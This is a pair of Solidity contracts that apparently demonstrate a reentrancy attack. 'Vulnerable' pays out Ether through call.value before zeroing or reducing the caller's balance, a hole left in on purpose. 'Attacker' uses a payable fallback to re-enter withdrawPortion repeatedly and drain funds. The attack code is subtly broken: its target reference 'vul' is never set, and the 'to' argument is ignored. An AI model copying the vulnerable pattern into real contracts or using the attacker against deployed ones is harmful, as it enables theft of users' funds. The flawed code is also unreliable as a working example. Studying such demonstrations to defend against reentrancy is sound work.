pragma solidity ^0.4.18;

contract Vulnerable{
  mapping (address => uint) private userBalances;
  uint public totalbalance = 0;

  // deposit money
  function deposit() payable{ 
     userBalances[msg.sender] += msg.value; 
     totalbalance += msg.value;
  } 

  // withdraw all the Ether
  function withdrawAll(address to) external {
      uint256 amount = userBalances[msg.sender];
      if (userBalances[msg.sender] > 0) {
        msg.sender.call.value(amount)();
    	  userBalances[msg.sender] = 0;
      }
  }
  
  // withdraw part the Ether
  function withdrawPortion(uint amount) external {   
     if (userBalances[msg.sender] >= amount) {
        msg.sender.call.value(amount)();
        userBalances[msg.sender] -= amount;
     }
  }
}

pragma solidity ^0.4.18;
import './Vulnerable.sol';

contract Attacker{
  address private _owner;
  uint public count = 0;
  Vulnerable vul;

  //initial the attack contract with the vulnerable address
  function Attacker(){ 
     _owner = msg.sender;
  }

  function attack(){
    vul.withdrawAll(_owner);
  }

  function () payable{
     count++;
     if(count < 10){
       vul.withdrawPortion(1 ether);
     }
  }
}

